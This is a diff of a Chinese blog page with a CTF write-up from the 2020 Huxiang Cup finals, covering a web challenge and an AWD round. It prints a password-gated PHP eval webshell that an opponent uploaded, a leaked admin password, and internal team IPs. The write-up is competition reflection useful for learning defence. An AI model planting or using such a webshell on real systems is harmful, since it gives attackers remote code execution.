@@ -70,7 +70,7 @@
     <!-- rss -->
     
     
-<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
 </head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -185,12 +185,14 @@
 <p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201119084407.png" alt="cobra2"></p>
 <p>在源码日志中的 3014 行找到了后台密码，然后登陆成功</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ info ] [ PARAM ] array (</span><br><span class="line">&#39;id&#39; &#x3D;&gt; &#39;1&#39;,</span><br><span class="line">&#39;username&#39; &#x3D;&gt; &#39;admin&#39;,</span><br><span class="line">&#39;password&#39; &#x3D;&gt; &#39;apache123!@#qweasdzxc&#39;,</span><br><span class="line">&#39;name&#39; &#x3D;&gt; &#39;s&#39;,</span><br><span class="line">&#39;avatar&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">&#39;file&#39; &#x3D;&gt; &#39;&#39;,</span><br></pre></td></tr></table></figure>
+
 <p>但是其实这一波我们走错方向了，进入后台后就一直在想文件上传，开始什么文件都上传不了<img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201119085551.png" alt="Snipaste_2020-11-15_10-08-22"></p>
 <p>分析了一下源码，结合报错信息（这个创建失败前面返回的路径明显是有问题的），发现是由于没有权限或者路径不正确导致创建失败。于是抓包通过一个参数改了文件上传路径，回显上传成功，但是访问的时候又找不到。所以感觉是假的成功。。。</p>
 <p>时间不够，导致就匆匆结束了。赛后问别的师傅，说是利用 thinkPHP5 的一个 payload 直接就能命令执行，我？？？</p>
 <p>其实队友是准备了 payload 的，也试着打了的，但是不知道什么原因没有打成功。有点拉胯哦</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>电脑里要准备好一些常用 cms 的 exp 库，遇到难题不要死磕，要变换思路，及时止损。</p>
 <h2 id="下午-AWD"><a href="#下午-AWD" class="headerlink" title="下午 AWD"></a>下午 AWD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">账号 XXXXXXXX</span><br><span class="line"></span><br><span class="line">密码 XXXXXXXX</span><br><span class="line"></span><br><span class="line">平台 192.168.100.100</span><br><span class="line"></span><br><span class="line">资产 172.16.105.200</span><br><span class="line"></span><br><span class="line">Elli0t  172.16.105.5</span><br><span class="line"></span><br><span class="line">N0vice 172.16.105.3</span><br><span class="line"></span><br><span class="line">karsa 172.16.105.4</span><br></pre></td></tr></table></figure>
+
 <p><a target="_blank" rel="noopener" href="https://github.com/ybm911/Blog_Document/tree/master/awd/2020%E6%B9%96%E6%B9%98%E6%9D%AF%E5%86%B3%E8%B5%9B/%E4%B8%8B%E5%8D%88AWD">源码</a></p>
 <p>总共三台 web 一台 pwn：靶机一两个 web，靶机二一个 pwn 一个 web</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201119083759.png" alt="Snipaste_2020-11-15_08-29-42"></p>
@@ -209,6 +211,7 @@
 </ul>
 <p>由于没有修改 upload 源码，未有效过滤上传文件，导致 fix 已结束就被上传蠕虫木马</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (md5(md5(<span class="variable">$p</span>)) === <span class="string">&#x27;eb0071c721992c8ce8973e824c675e0e&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>以上是常规一句话，但是由于攻击者将其写入进程，导致无法删除。之前准备的删除不死🐎的命令由于之前没有使用过，导致命令报错。。。（我 tm 直接思考人生</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201119133041.gif" alt="苦闷"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201119130920.png" alt="Snipaste_2020-11-15_16-18-28"></p>
